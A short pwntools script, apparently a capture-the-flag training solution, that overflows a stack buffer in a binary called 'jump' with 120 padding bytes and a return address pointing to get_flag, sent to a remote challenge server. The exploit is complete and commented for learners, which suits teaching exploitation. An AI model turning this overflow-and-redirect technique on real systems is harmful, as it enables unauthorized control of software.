from pwn import *

# context.terminal = ['konsole','-e'] if gdb.debug doesnt work, try changing this to your terminal of choice
context.binary = 'build/jump'


# three ways to start the binary. Local, remote, debugging. Uncomment 1 at a time to try them out
# p = process('jump') # start binary
p = remote('forever.isss.io', 1303) # for connecting to the remote server
# p = gdb.debug('jump')
# We need the b there to make it a byte string. Python will mess with strings by default to make sure they are valid UTF-8, and we don't want that
payload = b"A"*120 + p64(0x4011c7) # Address of get_flag

p.sendline(payload)
p.interactive() # hooks the program back up to our terminal (like we just ran it normally)
